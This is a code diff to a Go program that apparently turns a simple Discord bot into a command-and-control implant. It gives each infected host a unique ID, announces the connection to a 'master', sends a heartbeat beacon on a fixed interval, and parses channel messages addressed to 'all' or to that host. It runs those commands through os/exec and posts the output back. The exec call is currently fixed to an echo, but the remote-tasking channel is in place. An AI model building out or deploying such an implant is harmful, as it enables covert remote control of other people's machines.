@@ -2,13 +2,22 @@ package main
 
 import (
 	"fmt"
+	"github.com/google/uuid"
 	"os"
+	"os/exec"
 	"os/signal"
 	"syscall"
+	"time"
 
 	"github.com/brnlee/DiscordGo_CC/discord"
 	"github.com/bwmarrin/discordgo"
 )
+
+var botID string
+
+func init() {
+	botID = uuid.New().String()
+}
 
 func main() {
 
@@ -28,14 +37,23 @@ func main() {
 		fmt.Println("error opening connection,", err)
 		return
 	}
-
+	// Tell master that it is now connected
+	discord.SendMessage(dg, fmt.Sprintf("%s\n%q\n%q", botID, "Connected", "None"))
 	// Wait here until CTRL-C or other term signal is received.
 	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
 	sc := make(chan os.Signal, 1)
 	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
-	<-sc
 
+	// Heartbeat notification every 15 seconds
+	go func(s *discordgo.Session) {
+		for _ = range time.Tick(discord.Timeout * time.Second) {
+			discord.SendMessage(s, fmt.Sprintf("%s\n%q\n%q", botID, "Connected", "None"))
+		}
+	}(dg)
+
+	<-sc
 	// Cleanly close down the Discord session.
+	println("Closing Discord Session")
 	e := dg.Close()
 	if e != nil {
 		println("There was an error closing the Discord session connection.")
@@ -51,13 +69,22 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	if m.Author.ID == s.State.User.ID {
 		return
 	}
-	// If the message is "ping" reply with "Pong!"
-	if m.Content == "ping" {
-		discord.SendMessage(s, "Pong!")
+	var target string
+	var action string
+	var arg string
+	n, err := fmt.Sscanf(m.Content, "%s\n%s\n%q", &target, &action, &arg)
+	if err != nil || n != 3 {
+		return
 	}
-
-	// If the message is "pong" reply with "Ping!"
-	if m.Content == "pong" {
-		discord.SendMessage(s, "Ping!")
+	if target == "all" || target == botID {
+		println("Received Command", action, arg)
+		cmd := exec.Command("echo", "Hello World")
+		stdout, err := cmd.Output()
+		if err != nil {
+			println(err)
+			return
+		}
+		response := fmt.Sprintf("%s\n%q\n%q", botID, action+" "+arg, string(stdout))
+		discord.SendMessage(s, response)
 	}
 }
